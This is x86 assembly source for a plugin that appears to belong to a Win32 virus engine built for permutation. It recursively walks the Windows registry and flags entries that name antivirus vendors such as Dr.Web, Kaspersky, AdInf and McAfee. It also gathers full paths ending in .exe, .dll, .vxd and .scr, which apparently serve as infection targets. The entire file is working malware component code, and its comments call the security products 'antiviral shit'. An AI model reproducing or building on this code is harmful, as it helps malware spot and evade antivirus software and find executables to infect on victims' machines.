   ; REGSCAN
   ; ~~~~~~~
   ; - registry scanner
   ;   þ for antiviral registry entries (gen notify)
   ;   þ for filenames

   C_MULTIKEYSIZE          equ     1024    ; max length of key\key\key string
   C_SINGLEKEYSIZE         equ     256     ; max length of single key
   C_VALUENAMESIZE         equ     256     ; max length of value name
   C_VALUESIZE             equ     512     ; max length of value

   include                 INCLUDE\consts.inc
   include                 k32man.inc

   include                 plugin.inc
                           PLUGIN_START    REGSCAN, W32R3, PERMUTABLE

   handleevent:            hookevent EV_REGSCAN_GO, _regscan
                           stc
                           retn

   _regscan:               pusha
                           sub     esp, C_MULTIKEYSIZE

                           mov     ebx, 80000000h
                           mov     edi, esp
                           mov     word ptr [edi], '0'
   __cycle:                call    scankey
                           inc     byte ptr [edi]
                           inc     ebx
                           cmp     bl, 6
                           jbe     __cycle

                           add     esp, C_MULTIKEYSIZE
                           popa
                           clc     ; handled
                           retn

   ; input: EBX=hKey
   ;        EDI=keyname

   scankey:                pusha

                           xor     eax, eax
                           dec     eax
                           dec     edi
   __scan0:                inc     edi
                           inc     eax
                           cmp     byte ptr [edi], 0
                           jne     __scan0
                           cmp     eax, C_MULTIKEYSIZE-C_SINGLEKEYSIZE-1
                           jae     __quit
                           mov     al, '\'
                           stosb

                           xor     esi, esi        ; subkey index

   __cycle:                push    C_SINGLEKEYSIZE ; cbName
                           push    edi             ; lpName
                           push    esi             ; dwIndex
                           push    ebx             ; hKey
                           callREG RegEnumKeyA
                           or      eax, eax
                           jnz     __exit

   ;                       mov     edx, [esp].pusha_edi
   ;                       call    dump_asciiz_edx
   ;                       call    dump_crlf

                           push    eax
                           push    esp             ; phkResult
                           push    edi             ; lpSubKey
                           push    ebx             ; hKey
                           callREG RegOpenKeyA
                           or      eax, eax
                           pop     eax             ; EAX<--hKey
                           jnz     __skip

                           xchg    edi, [esp].pusha_edi
                           xchg    ebx, eax
                           call    scanvalue       ; scan current key's values
                           call    scankey         ; recursivly scan subkeys
                           xchg    ebx, eax
                           xchg    edi, [esp].pusha_edi

                           push    eax             ; hKey
                           callREG RegCloseKey

   __skip:                 inc     esi             ; subkey index
                           jmp     __cycle

   __exit:                 mov     byte ptr [edi-1], 0

   __quit:                 popa
                           retn

   ; input: EBX=hKey
   ;        EDI=keyname

   scanvalue:              pusha
                           sub     esp, C_VALUENAMESIZE
                           mov     edi, esp        ; EDI = ValueName
                           sub     esp, C_VALUESIZE

                           xor     esi, esi        ; value index

   __cycle:                push    C_VALUESIZE     ; Value length
                           mov     ecx, esp
                           push    C_VALUENAMESIZE ; ValueName length
                           mov     edx, esp
                           push    0               ; Type
                           mov     eax, esp

                           push    ecx             ; lpcbData
                           lea     ecx, [esp+16]
                           push    ecx             ; lpData
                           push    eax             ; lpType
                           push    0               ; lpReserved
                           push    edx             ; lpcbValueName
                           push    edi             ; lpValueName
                           push    esi             ; dwIndex
                           push    ebx             ; hKey
                           callREG RegEnumValueA
                           or      eax, eax
                           pop     eax             ; Type
                           pop     edx             ; ValueName length
                           pop     ecx             ; Value length
                           jnz     __exit

                           cmp     eax, REG_SZ     ; Type
                           jne     __skip
   ;                       or      edx, edx        ; ValueName length
   ;                       jz      __skip
   ;                       or      ecx, ecx        ; Value length
   ;                       jz      __skip

                           mov     edx, [esp+C_VALUENAMESIZE+C_VALUESIZE].pusha_edi
                           mov     ecx, esp
                           call    checkbadname

   __skip:                 inc     esi             ; value index
                           jmp     __cycle

   __exit:                 add     esp, C_VALUENAMESIZE+C_VALUESIZE
                           popa
                           retn

   ; input: EBX=hKey
   ;        EDX=keyname
   ;        EDI=valuename (may be zero-length)
   ;        ECX=value     (may be zero-length)

   checkbadname:           pusha

                           mov     esi, edx
                           call    findbadsubstr
                           je      __av
                           mov     esi, edi
                           call    findbadsubstr
                           je      __av
                           mov     esi, ecx
                           call    findbadsubstr
                           jne     __notav

   __av:                   xchg    ecx, edx        ; !!!
                           event   EV_REGSCAN_FOUND_AV_ENTRY

                           jmp     __exit

   __notav:                mov     esi, ecx
                           call    checkfname
                           jne     __exit

   __fname:                xchg    ecx, edx        ; !!!
                           event   EV_REGSCAN_GOT_FILENAME

   __exit:                 popa
                           retn

   checkfname:             pusha

                           cmp     word ptr [esi+1], '\:'
                           jne     __exit

   __scan0:                mov     al, [esi]
                           inc     esi
                           or      al, al
                           jnz     __scan0
                           mov     eax, [esi-5]
                           ; we may check only '.' here,
                           ; but then too many events will be generated
                           or      eax, 20202000h
                           neg     eax

                           cmp     eax, -EXT_EXE
                           je      __exit
                           cmp     eax, -EXT_DLL
                           je      __exit
                           cmp     eax, -EXT_VXD
                           je      __exit
                           cmp     eax, -EXT_SCR
                           je      __exit

   __exit:                 popa
                           retn

   ; input:  EDX,EDI,ECX=asciiz
   ; output: ZF==0 (jnz) -- normal strings
   ;         ZF==1 (jz)  -- antiviral shit

   findbadsubstr:          pusha
   __cycle:                mov     eax, [esi]
                           or      al, al
                           jz      __good
                           or      eax, 20202020h
   ; REP SCASD can help here... but, maybe i'll use permutation, so...
                           neg     eax

                           cmp     eax, -'ewrd' ; drweb
                           jz      __bad
                           cmp     eax, -'vadi' ; idavlab
                           jz      __bad
                           cmp     eax, -'psak' ; kasp
                           jz      __bad
                           cmp     eax, -'nida' ; adinf
                           jz      __bad
                           cmp     eax, -'sdia' ; aids
                           jz      __bad
                           cmp     eax, -'ipva' ; avpi
                           jz      __bad
                           cmp     eax, -'itna' ; anti
                           jz      __bad
                           cmp     eax, -'uriv' ; viru
                           jz      __bad
                           cmp     eax, -'es-f' ; f-secure
                           jz      __bad
                           cmp     eax, -'facm' ; mcafee
                           jz      __bad

                           inc     esi
                           jmp     __cycle
   __good:                 inc     eax     ; ZF==0
   __bad:                  popa
                           retn

                           PLUGIN_END
